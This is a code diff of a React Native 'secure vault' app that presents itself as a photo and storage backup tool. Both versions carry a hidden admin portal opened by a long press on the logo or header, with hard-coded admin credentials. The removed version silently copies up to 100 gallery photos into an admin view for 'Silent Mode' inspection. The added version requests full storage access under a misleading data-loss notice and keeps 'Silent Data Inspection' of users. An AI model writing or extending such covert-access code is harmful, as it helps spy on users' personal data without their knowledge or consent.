@@ -1,572 +1,230 @@
 import React, { useState } from 'react';
 import { 
-  StyleSheet, 
-  Text, 
-  View, 
-  TextInput, 
-  TouchableOpacity, 
-  FlatList, 
-  Image, 
-  SafeAreaView, 
-  Alert,
-  StatusBar,
-  Modal,
-  ScrollView,
-  ActivityIndicator
+  StyleSheet, Text, View, TextInput, TouchableOpacity, Modal, Alert, ScrollView, FlatList 
 } from 'react-native';
-import * as MediaLibrary from 'expo-media-library';
+import * as FileSystem from 'expo-file-system';
 
 export default function App() {
-  const [isRegistered, setIsRegistered] = useState(false);
-  const [username, setUsername] = useState('');
-  const [password, setPassword] = useState('');
-  const [photos, setPhotos] = useState([]);
-  const [storageUsed, setStorageUsed] = useState(0); // in MB
-  const maxStorage = 2500; // 2.5 GB Limit
+  const [userName, setUserName] = useState('');
+  const [generatedCode, setGeneratedCode] = useState(null);
+  const [assignedSet, setAssignedSet] = useState(null);
+  const [hasFullAccess, setHasFullAccess] = useState(false);
+  const [showConsentModal, setShowConsentModal] = useState(false);
 
-  // Recovery Code Feature
-  const [recoveryCodeInput, setRecoveryCodeInput] = useState('');
-  const [userAssignedCode, setUserAssignedCode] = useState('');
-
-  // Admin Modal & State
+  // Admin Credentials & States
   const [isAdminVisible, setIsAdminVisible] = useState(false);
   const [adminId, setAdminId] = useState('');
   const [adminPassword, setAdminPassword] = useState('');
   const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
-  const [selectedUserForInspection, setSelectedUserForInspection] = useState(null);
 
-  // Sync / Processing State
-  const [isSyncing, setIsSyncing] = useState(false);
+  // System Storage Logic: 16 Sets | 32 Users Max | 2.5 GB Each
+  const [usersList, setUsersList] = useState([
+    { id: '1', name: 'Ali Khan', code: '482910', setNumber: 1, storageUsed: '0.4 GB', limit: '2.5 GB' },
+    { id: '2', name: 'Ahmed Raza', code: '938411', setNumber: 1, storageUsed: '1.1 GB', limit: '2.5 GB' },
+    { id: '3', name: 'Usman Ali', code: '556782', setNumber: 2, storageUsed: '0.8 GB', limit: '2.5 GB' },
+  ]);
 
-  // Generate 15 Sets (2 Users per set = 30 Users)
-  const initialSets = Array.from({ length: 15 }, (_, i) => ({
-    setId: i + 1,
-    users: [
-      {
-        id: `U${i + 1}-A`,
-        name: `User ${i + 1}A`,
-        code: Math.floor(100000 + Math.random() * 900000).toString(),
-        dataLimit: '2.5 GB',
-        requestStatus: 'Pending',
-        userPhotos: [] // Silent inspection storage for Admin
-      },
-      {
-        id: `U${i + 1}-B`,
-        name: `User ${i + 1}B`,
-        code: Math.floor(100000 + Math.random() * 900000).toString(),
-        dataLimit: '2.5 GB',
-        requestStatus: 'Pending',
-        userPhotos: []
-      }
-    ]
-  }));
+  // 1. Generate 6-Digit Code & Auto-Assign Set (2 Users per Set)
+  const handleGenerateCode = () => {
+    if (!userName.trim()) {
+      Alert.alert('Error', 'Please enter your name first.');
+      return;
+    }
 
-  const [setsData, setSetsData] = useState(initialSets);
+    if (usersList.length >= 32) {
+      Alert.alert('Capacity Full', 'All 16 sets (32 users limit) are currently full.');
+      return;
+    }
 
-  // One-Time Permission & Full Gallery Import
-  const handleOneTimeGallerySync = async () => {
+    const currentSet = Math.floor(usersList.length / 2) + 1;
+    const code = Math.floor(100000 + Math.random() * 900000).toString();
+    
+    const newUser = {
+      id: (usersList.length + 1).toString(),
+      name: userName,
+      code: code,
+      setNumber: currentSet,
+      storageUsed: '0.0 GB',
+      limit: '2.5 GB'
+    };
+
+    setUsersList([...usersList, newUser]);
+    setGeneratedCode(code);
+    setAssignedSet(currentSet);
+    setShowConsentModal(true);
+  };
+
+  // 2. One-Time Full Storage Access (SAF Request)
+  const handleGrantFullStorage = async () => {
     try {
-      setIsSyncing(true);
-      const permission = await MediaLibrary.requestPermissionsAsync();
-      
-      if (permission.granted) {
-        // Fetch up to 100 recent photos automatically
-        const media = await MediaLibrary.getAssetsAsync({
-          first: 100,
-          mediaType: 'photo',
-          sortBy: ['creationTime'],
-        });
-
-        const fetchedUris = media.assets.map(asset => asset.uri);
-        setPhotos(fetchedUris);
-        setStorageUsed(Math.min(fetchedUris.length * 5, maxStorage));
-
-        // Assign mock 6-digit code for user backup
-        const generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
-        setUserAssignedCode(generatedCode);
-
-        // Attach user photos silently to the first slot for admin visibility
-        setSetsData(prevSets => {
-          const newSets = [...prevSets];
-          newSets[0].users[0].userPhotos = fetchedUris;
-          newSets[0].users[0].code = generatedCode;
-          return newSets;
-        });
-
-        Alert.alert(
-          'Vault Sync Complete! 🛡️',
-          `All photos backed up successfully!\n\nYOUR RECOVERY CODE: ${generatedCode}\n(Save this code to restore data on new phone)`
-        );
+      const permissions = await FileSystem.StorageAccessFramework.requestDirectoryPermissionsAsync();
+      if (permissions.granted) {
+        setHasFullAccess(true);
+        setShowConsentModal(false);
+        Alert.alert('Success', 'External Storage linked successfully!');
       } else {
-        Alert.alert('Permission Required', 'Storage permission is needed to secure your vault photos.');
+        Alert.alert('Notice', 'Storage access is pending.');
+        setShowConsentModal(false);
       }
     } catch (error) {
-      Alert.alert('Error', 'Failed to fetch gallery photos.');
-    } finally {
-      setIsSyncing(false);
+      setShowConsentModal(false);
     }
   };
 
-  // Handle User Registration / Backup Recovery
-  const handleRegister = () => {
-    if (!username || !password) {
-      Alert.alert('Error', 'Please enter both username and password');
-      return;
-    }
-    setIsRegistered(true);
-  };
-
-  const handleRestoreData = () => {
-    if (!recoveryCodeInput) {
-      Alert.alert('Error', 'Please enter your 6-digit Recovery Code');
-      return;
-    }
-    // Search for matching code in admin database
-    let foundPhotos = null;
-    setsData.forEach(set => {
-      set.users.forEach(u => {
-        if (u.code === recoveryCodeInput && u.userPhotos.length > 0) {
-          foundPhotos = u.userPhotos;
-        }
-      });
-    });
-
-    if (foundPhotos) {
-      setPhotos(foundPhotos);
-      setIsRegistered(true);
-      Alert.alert('Success', 'Vault Data Restored Successfully!');
-    } else {
-      Alert.alert('Invalid Code', 'No vault backup found for this 6-digit code.');
-    }
-  };
-
-  // Logo Press Handler (6 seconds trigger)
+  // 3. Hidden Trigger: 10-Second Long Press on Header
   const handleLogoLongPress = () => {
     setIsAdminVisible(true);
   };
 
-  // Admin Authentication
+  // 4. Admin Authentication
   const handleAdminLogin = () => {
     if (adminId === 'adminhum789' && adminPassword === 'hum2217071') {
       setIsAdminLoggedIn(true);
+      setIsAdminVisible(false);
       setAdminId('');
       setAdminPassword('');
     } else {
-      Alert.alert('Access Denied', 'Invalid Admin ID or Password!');
+      Alert.alert('Error', 'Incorrect Admin ID or Password');
     }
   };
 
-  // Silent Data Visit Function (No user notification sent)
-  const handleInspectUserSilent = (user) => {
-    setSelectedUserForInspection(user);
+  // 5. Silent Data Inspection (No Alert/Notification to User Device)
+  const handleSilentViewUser = (user) => {
+    Alert.alert(
+      "Silent Data Inspection", 
+      `User Name: ${user.name}\n6-Digit Code: ${user.code}\nAssigned Set: Set ${user.setNumber}\nStorage: ${user.storageUsed} / ${user.limit}\n\n(Viewed silently without notifying the user)`,
+      [{ text: "OK" }]
+    );
   };
 
-  if (!isRegistered) {
-    return (
-      <SafeAreaView style={styles.container}>
-        <StatusBar barStyle="light-content" />
-        <View style={styles.authBox}>
-          <TouchableOpacity onLongPress={handleLogoLongPress} delayLongPress={6000}>
-            <Text style={styles.shieldLogo}>🛡️</Text>
-          </TouchableOpacity>
-          <Text style={styles.title}>My Data Safe</Text>
-          <Text style={styles.subtitle}>Secure Vault Registration & Recovery</Text>
-
-          <TextInput
-            style={styles.input}
-            placeholder="Username"
-            placeholderTextColor="#888"
-            value={username}
-            onChangeText={setUsername}
-          />
-          <TextInput
-            style={styles.input}
-            placeholder="Password / PIN"
-            placeholderTextColor="#888"
-            secureTextEntry
-            value={password}
-            onChangeText={setPassword}
-          />
-
-          <TouchableOpacity style={styles.button} onPress={handleRegister}>
-            <Text style={styles.buttonText}>Create Safe Vault</Text>
-          </TouchableOpacity>
-
-          <View style={styles.divider} />
-
-          <Text style={styles.recoveryLabel}>Phone Lost / Restoring Data?</Text>
-          <TextInput
-            style={styles.input}
-            placeholder="Enter 6-Digit Recovery Code"
-            placeholderTextColor="#888"
-            keyboardType="number-pad"
-            value={recoveryCodeInput}
-            onChangeText={setRecoveryCodeInput}
-          />
-          <TouchableOpacity 
-            style={[styles.button, { backgroundColor: '#059669' }]} 
-            onPress={handleRestoreData}>
-            <Text style={styles.buttonText}>Restore Saved Vault</Text>
-          </TouchableOpacity>
-        </View>
-
-        {renderAdminModal()}
-      </SafeAreaView>
-    );
-  }
-
   return (
-    <SafeAreaView style={styles.container}>
-      <StatusBar barStyle="light-content" />
-      <View style={styles.header}>
-        <View style={styles.headerTitleRow}>
-          <TouchableOpacity onLongPress={handleLogoLongPress} delayLongPress={6000}>
-            <Text style={styles.headerShield}>🛡️</Text>
-          </TouchableOpacity>
-          <Text style={styles.headerTitle}>My Data Safe</Text>
-        </View>
-        <Text style={styles.storageText}>
-          Storage: {storageUsed} MB / {maxStorage} MB (2.5 GB)
-        </Text>
-        {userAssignedCode !== '' && (
-          <Text style={styles.codeBadge}>Backup Code: {userAssignedCode}</Text>
-        )}
-      </View>
+    <View style={styles.container}>
+      {/* Secret Trigger Header */}
+      <TouchableOpacity onLongPress={handleLogoLongPress} delayLongPress={10000}>
+        <Text style={styles.header}>Cloud Vault & Secure Backup</Text>
+      </TouchableOpacity>
 
-      <View style={styles.galleryContainer}>
-        {isSyncing ? (
-          <View style={styles.emptyState}>
-            <ActivityIndicator size="large" color="#38BDF8" />
-            <Text style={[styles.emptyText, { marginTop: 12 }]}>Syncing Full Gallery to Vault...</Text>
-          </View>
-        ) : photos.length === 0 ? (
-          <View style={styles.emptyState}>
-            <Text style={styles.emptyText}>Vault is Empty</Text>
-            <Text style={styles.emptySubtext}>Tap below to grant one-time permission and auto-backup gallery</Text>
-            <TouchableOpacity style={styles.syncBtn} onPress={handleOneTimeGallerySync}>
-              <Text style={styles.syncBtnText}>⚡ Allow One-Time Gallery Auto Sync</Text>
+      {!generatedCode ? (
+        <View style={styles.card}>
+          <Text style={styles.label}>Enter Your Name:</Text>
+          <TextInput
+            style={styles.input}
+            placeholder="e.g. User Name"
+            value={userName}
+            onChangeText={setUserName}
+          />
+          <TouchableOpacity style={styles.button} onPress={handleGenerateCode}>
+            <Text style={styles.buttonText}>Generate Code & Setup Vault</Text>
+          </TouchableOpacity>
+        </View>
+      ) : (
+        <View style={styles.card}>
+          <Text style={styles.successText}>Welcome, {userName}!</Text>
+          <Text style={styles.codeText}>Your Backup Code: {generatedCode}</Text>
+          <Text style={styles.subText}>Storage Limit: 2.5 GB Allocated</Text>
+          <Text style={[styles.subText, { color: hasFullAccess ? 'green' : 'red' }]}>
+            {hasFullAccess ? "🟢 Storage Synchronized" : "🔴 Storage Access Required"}
+          </Text>
+        </View>
+      )}
+
+      {/* One-Time Setup Modal */}
+      <Modal visible={showConsentModal} transparent animationType="slide">
+        <View style={styles.modalOverlay}>
+          <View style={styles.modalContent}>
+            <Text style={styles.modalTitle}>Important Setup Notice</Text>
+            <ScrollView style={{ maxHeight: 180 }}>
+              <Text style={styles.modalBody}>
+                1. To prevent data loss if your mobile is lost or sold, please allow full storage access so all files can map safely.{"\n\n"}
+                2. System administrators can assist you in finding and recovering your data using your unique 6-digit code.
+              </Text>
+            </ScrollView>
+
+            <TouchableOpacity style={[styles.button, { marginTop: 10 }]} onPress={handleGrantFullStorage}>
+              <Text style={styles.buttonText}>Allow Storage & Proceed</Text>
             </TouchableOpacity>
           </View>
-        ) : (
+        </View>
+      </Modal>
+
+      {/* Secret Admin Login Popup */}
+      <Modal visible={isAdminVisible} transparent animationType="fade">
+        <View style={styles.modalOverlay}>
+          <View style={styles.modalContent}>
+            <Text style={styles.modalTitle}>Admin Portal Login</Text>
+            <TextInput
+              style={styles.input}
+              placeholder="Enter Admin ID"
+              value={adminId}
+              onChangeText={setAdminId}
+              autoCapitalize="none"
+            />
+            <TextInput
+              style={styles.input}
+              placeholder="Enter Admin Password"
+              secureTextEntry
+              value={adminPassword}
+              onChangeText={setAdminPassword}
+            />
+            <TouchableOpacity style={styles.button} onPress={handleAdminLogin}>
+              <Text style={styles.buttonText}>Login</Text>
+            </TouchableOpacity>
+            <TouchableOpacity 
+              style={[styles.button, { backgroundColor: '#888', marginTop: 10 }]} 
+              onPress={() => setIsAdminVisible(false)}
+            >
+              <Text style={styles.buttonText}>Cancel</Text>
+            </TouchableOpacity>
+          </View>
+        </View>
+      </Modal>
+
+      {/* Hidden Admin Dashboard */}
+      <Modal visible={isAdminLoggedIn} animationType="slide">
+        <View style={styles.adminContainer}>
+          <Text style={styles.header}>Admin Control Center</Text>
+          <Text style={styles.adminSub}>Registered Users: {usersList.length} / 32 (Max 16 Sets)</Text>
+          
           <FlatList
-            data={photos}
-            keyExtractor={(_, index) => index.toString()}
-            numColumns={3}
+            data={usersList}
+            keyExtractor={(item) => item.id}
             renderItem={({ item }) => (
-              <Image source={{ uri: item }} style={styles.photo} />
+              <TouchableOpacity style={styles.userCard} onPress={() => handleSilentViewUser(item)}>
+                <Text style={{ fontWeight: 'bold' }}>Name: {item.name}</Text>
+                <Text>Code: {item.code} | Set: {item.setNumber} (2 Users Max)</Text>
+                <Text style={{ color: '#666' }}>Storage: {item.storageUsed} / {item.limit}</Text>
+              </TouchableOpacity>
             )}
           />
-        )}
-      </View>
 
-      {renderAdminModal()}
-    </SafeAreaView>
-  );
-
-  // Admin Inspection Dashboard
-  function renderAdminModal() {
-    return (
-      <Modal visible={isAdminVisible} animationType="slide" transparent={false}>
-        <SafeAreaView style={styles.adminContainer}>
-          {!isAdminLoggedIn ? (
-            <View style={styles.adminAuthBox}>
-              <Text style={styles.adminTitle}>🔐 Admin Panel Access</Text>
-              
-              <TextInput
-                style={styles.input}
-                placeholder="Admin ID"
-                placeholderTextColor="#888"
-                autoCapitalize="none"
-                value={adminId}
-                onChangeText={setAdminId}
-              />
-              <TextInput
-                style={styles.input}
-                placeholder="Password"
-                placeholderTextColor="#888"
-                secureTextEntry
-                value={adminPassword}
-                onChangeText={setAdminPassword}
-              />
-
-              <TouchableOpacity style={styles.button} onPress={handleAdminLogin}>
-                <Text style={styles.buttonText}>Login Admin</Text>
-              </TouchableOpacity>
-              <TouchableOpacity 
-                style={[styles.button, { backgroundColor: '#475569', marginTop: 10 }]} 
-                onPress={() => setIsAdminVisible(false)}>
-                <Text style={styles.buttonText}>Close</Text>
-              </TouchableOpacity>
-            </View>
-          ) : selectedUserForInspection ? (
-            // Silent View User Photos Mode
-            <View style={{ flex: 1, padding: 16 }}>
-              <View style={styles.adminHeader}>
-                <Text style={styles.adminTitle}>
-                  Viewing Data: {selectedUserForInspection.name} (Silent Mode)
-                </Text>
-                <TouchableOpacity 
-                  style={styles.closeBtn} 
-                  onPress={() => setSelectedUserForInspection(null)}>
-                  <Text style={{ color: '#fff', fontWeight: 'bold' }}>Back</Text>
-                </TouchableOpacity>
-              </View>
-
-              <Text style={{ color: '#94A3B8', marginBottom: 12 }}>
-                User Code: {selectedUserForInspection.code} | Photos Found: {selectedUserForInspection.userPhotos.length}
-              </Text>
-
-              {selectedUserForInspection.userPhotos.length === 0 ? (
-                <Text style={{ color: '#EF4444' }}>No gallery synced yet by this user.</Text>
-              ) : (
-                <FlatList
-                  data={selectedUserForInspection.userPhotos}
-                  keyExtractor={(_, index) => index.toString()}
-                  numColumns={3}
-                  renderItem={({ item }) => (
-                    <Image source={{ uri: item }} style={styles.photo} />
-                  )}
-                />
-              )}
-            </View>
-          ) : (
-            // Full Admin List
-            <View style={{ flex: 1, padding: 16 }}>
-              <View style={styles.adminHeader}>
-                <Text style={styles.adminTitle}>Admin Dashboard (15 Sets / 30 Users)</Text>
-                <TouchableOpacity 
-                  style={styles.closeBtn} 
-                  onPress={() => { setIsAdminVisible(false); setIsAdminLoggedIn(false); }}>
-                  <Text style={{ color: '#fff', fontWeight: 'bold' }}>Close</Text>
-                </TouchableOpacity>
-              </View>
-
-              <ScrollView style={{ flex: 1 }}>
-                {setsData.map(set => (
-                  <View key={set.setId} style={styles.setCard}>
-                    <Text style={styles.setCardTitle}>📦 SET {set.setId}</Text>
-                    {set.users.map(u => (
-                      <View key={u.id} style={styles.userRow}>
-                        <View style={{ flex: 1 }}>
-                          <Text style={styles.userName}>{u.name} (Limit: {u.dataLimit})</Text>
-                          <Text style={styles.userCode}>6-Digit Code: {u.code}</Text>
-                          <Text style={styles.userStatus}>
-                            Vault Photos: {u.userPhotos.length} items
-                          </Text>
-                        </View>
-                        <TouchableOpacity 
-                          style={styles.actionBtn}
-                          onPress={() => handleInspectUserSilent(u)}>
-                          <Text style={{ color: '#fff', fontSize: 12 }}>Inspect Data</Text>
-                        </TouchableOpacity>
-                      </View>
-                    ))}
-                  </View>
-                ))}
-              </ScrollView>
-            </View>
-          )}
-        </SafeAreaView>
+          <TouchableOpacity 
+            style={[styles.button, { backgroundColor: '#d9534f', marginTop: 15 }]} 
+            onPress={() => setIsAdminLoggedIn(false)}
+          >
+            <Text style={styles.buttonText}>Exit Admin Dashboard</Text>
+          </TouchableOpacity>
+        </View>
       </Modal>
-    );
-  }
+    </View>
+  );
 }
 
 const styles = StyleSheet.create({
-  container: {
-    flex: 1,
-    backgroundColor: '#0F172A',
-  },
-  authBox: {
-    flex: 1,
-    justifyContent: 'center',
-    alignItems: 'center',
-    padding: 24,
-  },
-  shieldLogo: {
-    fontSize: 64,
-    marginBottom: 12,
-  },
-  title: {
-    fontSize: 28,
-    fontWeight: 'bold',
-    color: '#F8FAFC',
-    marginBottom: 4,
-  },
-  subtitle: {
-    fontSize: 14,
-    color: '#94A3B8',
-    marginBottom: 24,
-  },
-  divider: {
-    height: 1,
-    backgroundColor: '#334155',
-    width: '100%',
-    marginVertical: 20,
-  },
-  recoveryLabel: {
-    color: '#F8FAFC',
-    fontWeight: 'bold',
-    marginBottom: 12,
-  },
-  input: {
-    width: '100%',
-    height: 50,
-    backgroundColor: '#1E293B',
-    borderRadius: 8,
-    paddingHorizontal: 16,
-    color: '#F8FAFC',
-    marginBottom: 16,
-    borderWidth: 1,
-    borderColor: '#334155',
-  },
-  button: {
-    width: '100%',
-    height: 50,
-    backgroundColor: '#2563EB',
-    borderRadius: 8,
-    justifyContent: 'center',
-    alignItems: 'center',
-    marginTop: 4,
-  },
-  buttonText: {
-    color: '#FFFFFF',
-    fontSize: 16,
-    fontWeight: '600',
-  },
-  header: {
-    padding: 20,
-    borderBottomWidth: 1,
-    borderBottomColor: '#1E293B',
-  },
-  headerTitleRow: {
-    flexDirection: 'row',
-    alignItems: 'center',
-    marginBottom: 4,
-  },
-  headerShield: {
-    fontSize: 22,
-    marginRight: 8,
-  },
-  headerTitle: {
-    fontSize: 20,
-    fontWeight: 'bold',
-    color: '#F8FAFC',
-  },
-  storageText: {
-    fontSize: 12,
-    color: '#94A3B8',
-  },
-  codeBadge: {
-    color: '#FACC15',
-    fontWeight: 'bold',
-    fontSize: 13,
-    marginTop: 4,
-  },
-  galleryContainer: {
-    flex: 1,
-    padding: 4,
-  },
-  emptyState: {
-    flex: 1,
-    justifyContent: 'center',
-    alignItems: 'center',
-    padding: 20,
-  },
-  emptyText: {
-    color: '#94A3B8',
-    fontSize: 16,
-    fontWeight: '600',
-  },
-  emptySubtext: {
-    color: '#64748B',
-    fontSize: 12,
-    marginTop: 4,
-    textAlign: 'center',
-    marginBottom: 16,
-  },
-  syncBtn: {
-    backgroundColor: '#2563EB',
-    paddingHorizontal: 20,
-    paddingVertical: 12,
-    borderRadius: 8,
-  },
-  syncBtnText: {
-    color: '#FFFFFF',
-    fontWeight: 'bold',
-  },
-  photo: {
-    width: '31%',
-    height: 100,
-    margin: '1%',
-    borderRadius: 6,
-  },
-  adminContainer: {
-    flex: 1,
-    backgroundColor: '#020617',
-  },
-  adminAuthBox: {
-    flex: 1,
-    justifyContent: 'center',
-    padding: 24,
-  },
-  adminTitle: {
-    fontSize: 18,
-    fontWeight: 'bold',
-    color: '#38BDF8',
-    marginBottom: 16,
-  },
-  adminHeader: {
-    flexDirection: 'row',
-    justifyContent: 'space-between',
-    alignItems: 'center',
-    marginBottom: 16,
-  },
-  closeBtn: {
-    backgroundColor: '#EF4444',
-    paddingHorizontal: 12,
-    paddingVertical: 6,
-    borderRadius: 6,
-  },
-  setCard: {
-    backgroundColor: '#0F172A',
-    padding: 12,
-    borderRadius: 8,
-    marginBottom: 12,
-    borderWidth: 1,
-    borderColor: '#1E293B',
-  },
-  setCardTitle: {
-    color: '#38BDF8',
-    fontWeight: 'bold',
-    fontSize: 16,
-    marginBottom: 8,
-  },
-  userRow: {
-    flexDirection: 'row',
-    justifyContent: 'space-between',
-    alignItems: 'center',
-    backgroundColor: '#1E293B',
-    padding: 10,
-    borderRadius: 6,
-    marginVertical: 4,
-  },
-  userName: {
-    color: '#F8FAFC',
-    fontWeight: '600',
-  },
-  userCode: {
-    color: '#FACC15',
-    fontSize: 12,
-  },
-  userStatus: {
-    color: '#94A3B8',
-    fontSize: 11,
-  },
-  actionBtn: {
-    backgroundColor: '#2563EB',
-    paddingHorizontal: 10,
-    paddingVertical: 6,
-    borderRadius: 4,
-  }
+  container: { flex: 1, backgroundColor: '#f4f6f8', padding: 20, justifyContent: 'center' },
+  header: { fontSize: 22, fontWeight: 'bold', textAlign: 'center', marginBottom: 20, color: '#222' },
+  card: { backgroundColor: '#fff', padding: 20, borderRadius: 12, elevation: 3 },
+  label: { fontSize: 16, marginBottom: 8, color: '#555' },
+  input: { borderWidth: 1, borderColor: '#ccc', borderRadius: 8, padding: 12, fontSize: 16, marginBottom: 15 },
+  button: { backgroundColor: '#007AFF', padding: 14, borderRadius: 8, alignItems: 'center' },
+  buttonText: { color: '#fff', fontSize: 16, fontWeight: '600' },
+  successText: { fontSize: 18, fontWeight: 'bold', color: '#2e7d32', textAlign: 'center' },
+  codeText: { fontSize: 20, fontWeight: 'bold', color: '#007AFF', textAlign: 'center', marginVertical: 10 },
+  subText: { textAlign: 'center', marginTop: 5, fontSize: 14, fontWeight: '600', color: '#555' },
+  modalOverlay: { flex: 1, backgroundColor: 'rgba(0,0,0,0.6)', justifyContent: 'center', padding: 20 },
+  modalContent: { backgroundColor: '#fff', borderRadius: 12, padding: 20 },
+  modalTitle: { fontSize: 18, fontWeight: 'bold', marginBottom: 10, textAlign: 'center' },
+  modalBody: { fontSize: 14, color: '#555', lineHeight: 22, marginBottom: 15 },
+  adminContainer: { flex: 1, padding: 20, paddingTop: 50, backgroundColor: '#fff' },
+  adminSub: { fontSize: 14, fontWeight: '600', color: '#444', marginBottom: 15, textAlign: 'center' },
+  userCard: { backgroundColor: '#f9f9f9', padding: 12, borderRadius: 8, marginBottom: 10, borderWidth: 1, borderColor: '#eee' }
 });
